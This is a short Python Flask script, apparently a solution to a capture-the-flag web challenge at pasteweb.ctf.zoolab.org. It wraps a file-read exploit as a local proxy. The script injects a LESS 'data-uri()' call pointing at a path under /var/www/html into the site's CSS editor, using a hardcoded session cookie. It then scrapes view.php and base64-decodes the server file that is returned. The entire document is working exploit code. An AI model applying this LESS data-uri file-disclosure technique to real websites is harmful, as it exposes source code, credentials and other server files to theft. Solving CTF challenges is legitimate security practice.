from flask import Flask
import base64
import requests
import json



app = Flask(__name__)
cookies = { 'PHPSESSID' : 'j6h2hkmmmts4uao04u107i25lh' }

@app.route('/<path:path>')
def catch_all(path):
    editCSS(path)
    file_info = view()
    return file_info



def editCSS(path):
    #edit CSS
    url_edit = 'https://pasteweb.ctf.zoolab.org/editcss.php'
    value = { 'less' : "test {content: data-uri('/var/www/html/"+path+"');}"}
    print(f"[*] Update value :  {value}")
    print(f"[*] Check  path  :  {path} ")
    r = requests.post(url_edit, data=value, cookies=cookies)  


def view():
    #read file information - view.php
    url_view = 'https://pasteweb.ctf.zoolab.org/view.php'
    r = requests.get(url_view, cookies=cookies)  
    response = r.content.decode('utf-8')
    string_start = response.find(';base64,')
    string_end = response.find('");\n')
    info = response[string_start+8:string_end]
    print(f"[*] Origin Value :  {info}")
    print(f"[*] Return Value : ",base64.b64decode(info) )

    return base64.b64decode(info)

if __name__ == '__main__':
    app.run()
    




